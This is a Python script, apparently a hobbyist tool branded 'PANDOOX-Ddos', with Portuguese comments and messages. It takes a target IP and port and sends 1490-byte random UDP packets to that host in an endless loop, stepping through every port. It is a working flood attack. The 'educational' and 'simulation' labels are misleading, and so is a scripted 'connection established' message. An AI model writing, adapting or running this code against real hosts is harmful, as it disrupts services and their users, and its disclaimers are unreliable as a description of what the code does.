import os
import platform
import time
import socket
import random
from datetime import datetime
from pyfiglet import Figlet

# Função para limpar o terminal
def limpar_terminal():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

# Função para exibir título em arte ASCII
def mostrar_titulo(texto):
    f = Figlet(font='slant')
    print(f.renderText(texto))

# Informações de tempo atual
agora = datetime.now()
print("\033[92m")  # Cor verde no terminal

# Configuração do socket UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
dados = random._urandom(1490)

# Interface inicial
limpar_terminal()
mostrar_titulo("PANDOOX-Ddos")

print("Desenvolvido por : PANDOOX")
print("Autor            : PANDOOX")
print("⚠️ Atenção: Esta ferramenta é apenas para fins educacionais em ambiente controlado.")
print()

# Entrada de dados do usuário
ip = input("Endereço IP de destino : ")
try:
    porta = int(input("Porta de destino       : "))
except ValueError:
    print("⚠️ Porta inválida. Digite um número inteiro.")
    exit()

# Interface de simulação
limpar_terminal()
mostrar_titulo("PANDOOX-Ddos")
print("\033[92m")
print("🔄 Tentando Conexão com servidor...")
time.sleep(1)
print("✅ Conexão estabelecida com sucesso!")
time.sleep(1)
print("🚀 Simulação de envio de pacotes iniciada (ambiente controlado)")
time.sleep(1)

# Loop de envio de pacotes
enviados = 0
while True:
    try:
        sock.sendto(dados, (ip, porta))
        enviados += 1
        porta += 1
        print(f"Pacote {enviados} enviado para {ip} pela porta: {porta}")
        if porta > 65534:
            porta = 1
    except KeyboardInterrupt:
        print("\n🛑 Simulação encerrada pelo usuário.")
        break
    except Exception as erro:
        print(f"⚠️ Erro durante envio: {erro}")
        break
